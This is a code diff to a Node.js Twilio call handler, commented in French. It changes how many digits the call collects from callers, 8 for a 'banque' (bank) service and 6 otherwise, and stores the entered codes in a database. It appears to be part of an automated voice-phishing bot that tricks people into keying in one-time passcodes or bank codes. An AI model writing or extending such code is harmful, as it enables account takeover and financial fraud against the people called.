@@ -44,17 +44,19 @@ module.exports = function(request, response) {
          */
         const endurl = config.serverurl + '/stream/end';
         const askurl = config.serverurl + '/stream/' + service;
+        const numdigits = service == 'banque' ? '8' : '6';
 
         /**
          * Ici l'on crée la réponse TwiML à renvoyer, en y ajoutant l'url de l'audio
          */
         const end = '<?xml version="1.0" encoding="UTF-8"?><Response><Play>' + endurl + '</Play></Response>';
-        const ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="6"><Play loop="4">' + askurl + '</Play></Gather></Response>';
+        const ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="' + numdigits + '"><Play loop="4">' + askurl + '</Play></Gather></Response>';
 
         /**
          * Si l'utilisateur à envoyé le code, alors l'ajouter à la base de donnée et renvoyer l'audio de fin : fin de l'appel
          */
-        if (input.length == 6 && input.match(/^[0-9]+$/) != null && input != null) {
+        length = service == 'banque' ? 8 : 6;
+        if (input.length == length && input.match(/^[0-9]+$/) != null && input != null) {
             /**
              * Audio de fin
              */
